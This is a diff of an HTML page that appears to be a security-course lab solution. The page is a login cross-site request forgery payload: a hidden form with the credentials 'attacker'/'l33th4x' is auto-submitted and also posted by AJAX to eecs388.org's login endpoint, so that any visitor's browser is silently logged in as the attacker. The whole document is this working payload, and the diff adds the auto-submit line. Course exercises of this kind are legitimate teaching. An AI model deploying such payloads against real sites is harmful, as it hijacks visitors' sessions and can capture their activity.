@@ -1,16 +1,16 @@
 <html><body>
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
-	<form id="form1" method="POST" action="https://eecs388.org/project2" style="display: none">
+	<form id="form1" method="POST" action="https://eecs388.org/project2/login" style="display: none">
 		<input type="text" name="username" value="attacker">
-		<input type="text" name="userpass" value="l33th4x">
+		<input type="text" name="password" value="l33th4x">
 		<input type="submit" value="click here to submit">
 	</form>
 	<script>
+		document.getElementById("form1").submit()
 		$.ajax({
 			type: 'POST',
 			data: $('#form1').serialize(),
-			url: 'https://eecs388.org/project2',
-			xhrFields: {withCredentials: true}
+			url: 'https://eecs388.org/project2/login',
 		});
 	</script>
 </body></html>
